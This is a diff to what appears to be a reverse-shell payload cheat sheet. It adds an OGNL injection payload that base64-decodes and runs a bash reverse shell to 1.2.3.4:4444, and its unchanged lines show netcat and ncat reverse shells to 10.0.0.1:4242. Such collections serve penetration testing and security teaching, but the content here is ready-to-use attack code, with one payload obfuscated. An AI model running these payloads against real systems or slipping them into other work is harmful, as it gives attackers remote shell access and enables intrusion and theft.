@@ -22,6 +22,7 @@
     * [Netcat BusyBox](#netcat-busybox)
     * [Netcat Traditional](#netcat-traditional)
     * [NodeJS](#nodejs)
+    * [OGNL](#ognl)
     * [OpenSSL](#openssl)
     * [Perl](#perl)
     * [PHP](#php)
@@ -250,6 +251,12 @@ rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 ```bash
 ncat 10.0.0.1 4242 -e /bin/bash
 ncat --udp 10.0.0.1 4242 -e /bin/bash
+```
+
+### OGNL
+
+```java
+(#a='echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40LzQ0NDQgMD4mMScK | base64 -d | bash -i').(#b={'bash','-c',#a}).(#p=new java.lang.ProcessBuilder(#b)).(#process=#p.start())
 ```
 
 ### OpenSSL
